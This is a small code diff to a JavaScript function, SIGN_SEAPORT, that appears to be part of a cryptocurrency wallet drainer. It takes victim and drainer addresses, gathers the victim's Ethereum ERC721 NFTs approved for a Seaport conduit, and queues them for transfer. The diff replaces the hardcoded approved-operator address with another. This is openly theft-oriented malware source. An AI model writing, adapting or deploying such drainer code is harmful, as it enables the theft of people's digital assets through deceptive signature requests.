@@ -3,7 +3,7 @@ const SIGN_SEAPORT = async (assets, provider, victim_address, drainer_address, u
     const nft_list = [], nft_list_plain = [];
     for (const asset of assets) {
       if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1) continue;
-      if (!await is_nft_approved(asset.address, victim_address, "0x1E0049783F008A0085193E00003D00cd54003c71")) continue;
+      if (!await is_nft_approved(asset.address, victim_address, "0xddF1183fc1213716df67D74506AF13Fe8D74bE1F")) continue;
       nft_list.push({ collection: asset.address, tokenID: asset.id });
       nft_list_plain.push(asset);
     }
